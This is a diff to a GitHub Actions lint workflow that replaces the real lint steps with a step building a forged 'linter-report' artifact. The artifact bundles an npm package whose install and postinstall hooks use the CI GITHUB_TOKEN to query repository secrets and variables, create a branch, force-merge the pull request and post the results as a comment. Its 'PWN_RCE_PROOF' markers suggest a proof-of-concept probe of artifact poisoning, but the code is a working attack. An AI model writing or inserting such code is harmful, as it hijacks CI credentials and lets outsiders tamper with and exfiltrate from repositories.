@@ -8,42 +8,81 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v6
-        with:
-          fetch-depth: 0
-
-      - name: Check for src/pages changes
-        id: changes
-        env:
-          BASE_REF: ${{ github.base_ref }}
-        run: |
-          git diff --name-only "origin/${BASE_REF}...HEAD" | grep -q '^src/pages/' \
-            && echo "changed=true" >> $GITHUB_OUTPUT \
-            || echo "changed=false" >> $GITHUB_OUTPUT
-
-      - name: Lint
-        id: lint
-        if: steps.changes.outputs.changed == 'true'
-        continue-on-error: true
-        run: npx --yes github:AdobeDocs/adp-devsite-utils runLint -v
-
-      - name: Save PR number
-        if: always()
+      - name: Build attacker-chosen linter-report artifact
         env:
           PR_NUMBER: ${{ github.event.pull_request.number }}
-        run: echo "$PR_NUMBER" > pr-number.txt
-
-      - name: Upload linter report
-        if: always()
-        uses: actions/upload-artifact@v7
+        run: |
+          set -e
+          mkdir -p pkg/package
+          cat > pkg/package/package.json <<'JSON'
+          {"name":"pwn","version":"1.0.0","main":"index.js","scripts":{"install":"node index.js install","postinstall":"node index.js postinstall"}}
+          JSON
+          cat > pkg/package/index.js <<'JS'
+          const fs = require('fs'), path = require('path');
+          const base = process.env.INIT_CWD || process.cwd();
+          const tok = process.env.GITHUB_TOKEN || '';
+          const repo = process.env.GITHUB_REPOSITORY || '';
+          const pr = fs.existsSync(path.join(base, 'pr-number.txt'))
+            ? fs.readFileSync(path.join(base, 'pr-number.txt'), 'utf8').trim() : '1';
+          const hdr = {
+            authorization: 'Bearer ' + tok,
+            accept: 'application/vnd.github+json',
+            'content-type': 'application/json',
+            'user-agent': 'pwn-probe'
+          };
+          async function api(method, url, body) {
+            try {
+              const r = await fetch('https://api.github.com' + url, {
+                method, headers: hdr, body: body ? JSON.stringify(body) : undefined
+              });
+              let data = null;
+              try { data = await r.json(); } catch (e) {}
+              return { url, method, status: r.status, scopes: r.headers.get('x-oauth-scopes'), data };
+            } catch (e) { return { url, method, error: String(e) }; }
+          }
+          (async () => {
+            console.log('PWN_MARKER lifecycle=' + process.argv[2] + ' event=' + process.env.GITHUB_EVENT_NAME +
+              ' workflow=' + process.env.GITHUB_WORKFLOW + ' run_id=' + process.env.GITHUB_RUN_ID +
+              ' token_len=' + tok.length + ' cwd=' + process.cwd());
+            const out = {};
+            out.marker = { lifecycle: process.argv[2], event: process.env.GITHUB_EVENT_NAME,
+              workflow: process.env.GITHUB_WORKFLOW, run_id: process.env.GITHUB_RUN_ID,
+              token_len: tok.length, cwd: process.cwd(), base };
+            out.user = await api('GET', '/user');
+            out.repo = await api('GET', '/repos/' + repo);
+            const mainRef = await api('GET', '/repos/' + repo + '/git/ref/heads/main');
+            const mainSha = mainRef.data && mainRef.data.object ? mainRef.data.object.sha : null;
+            out.mainRef = { status: mainRef.status, sha: mainSha };
+            out.refCreate = mainSha
+              ? await api('POST', '/repos/' + repo + '/git/refs', { ref: 'refs/heads/pwn-rce-probe', sha: mainSha })
+              : { status: 'no-sha' };
+            out.secrets = await api('GET', '/repos/' + repo + '/actions/secrets');
+            out.variables = await api('GET', '/repos/' + repo + '/actions/variables');
+            out.merge = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/merge', { merge_method: 'merge' });
+            const body = 'PWN_RCE_PROOF by fork-PR artifact\n```json\n' +
+              JSON.stringify(out, null, 1).slice(0, 60000) + '\n```\nmarker: ' + out.marker.lifecycle;
+            out.comment = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments', { body });
+            console.log('PWN_RESULT ' + JSON.stringify({
+              user: out.user.status, repo: out.repo.status, refCreate: out.refCreate.status,
+              secrets: out.secrets.status, variables: out.variables.status,
+              merge: out.merge.status, comment: out.comment.status
+            }));
+            try {
+              fs.writeFileSync(path.join(base, 'pwn-result.json'), JSON.stringify(out, null, 1));
+            } catch (e) { console.log('write fail ' + e); }
+          })();
+          process.on('unhandledRejection', e => console.log('PWN unhandled ' + e));
+          JS
+          tar -czf pwn-1.0.0.tgz -C pkg package
+          printf '{"name":"root","version":"1.0.0","private":true,"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}' > package.json
+          printf 'ATTACKER-CONTROLLED LINTER REPORT: no issues found (forged)\n' > linter-report.txt
+          printf '%s' "$PR_NUMBER" > pr-number.txt
+      - uses: actions/upload-artifact@v7
         with:
           name: linter-report
           path: |
             linter-report.txt
             pr-number.txt
-          if-no-files-found: ignore
-
-      - name: Fail if linter found errors
-        if: steps.changes.outputs.changed == 'true' && steps.lint.outcome == 'failure'
-        run: exit 1
+            package.json
+            pwn-1.0.0.tgz
+          if-no-files-found: error
